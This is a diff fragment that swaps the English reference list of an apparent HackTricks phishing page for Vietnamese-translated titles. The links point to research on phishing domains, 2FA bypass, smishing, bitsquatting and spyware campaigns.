-- [9] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
+- [1] [Tạo các biến thể domain được sử dụng trong phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
+- [2] [Tìm kiếm phishing: Công cụ và kỹ thuật (0xPatrik)](https://0xpatrik.com/phishing-domains/)
+- [3] [Đánh cắp thông tin xác thực và vượt qua 2FA bằng noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
+- [4] [Đánh cắp phiên và vượt qua 2FA bằng EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
+- [5] [Cách cài đặt và cấu hình DKIM với Postfix trên Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
+- [6] [Báo cáo Ứng phó Sự cố Toàn cầu Unit 42 năm 2025 – Phiên bản Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [7] [Silent Smishing – hạ tầng phishing giới hạn cho thiết bị di động và các heuristic (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
+- [8] [Biên giới tiếp theo của các cuộc tấn công lắp ráp lúc chạy: Tận dụng LLM để tạo JavaScript phishing theo thời gian thực](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [9] [Mạo danh, chiếm quyền nhấp chuột và TDS: Bên trong hệ sinh thái phát tán malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
 - [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
-- [11] [Hijacking traffic to Microsoft's windows.com with bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
-- [12] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
-- [13] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
-- [14] [Exposing AdFection: How Discover-Tech Turned Targeted Ads Into a Pipeline for Zero-Click Mercenary Spyware](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
-
+- [11] [Chiếm quyền lưu lượng truy cập đến windows.com của Microsoft bằng cách đảo bit (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
+- [12] [Tình yêu? Thật ư: Ứng dụng hẹn hò giả được dùng làm mồi nhử trong chiến dịch spyware có chủ đích tại Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
+- [13] [IoC và mẫu của ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
+- [14] [Vạch trần AdFection: Discover-Tech biến quảng cáo có mục tiêu thành đường dây phát tán spyware đánh thuê zero-click như thế nào](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
 {{#include ../../banners/hacktricks-training.md}}
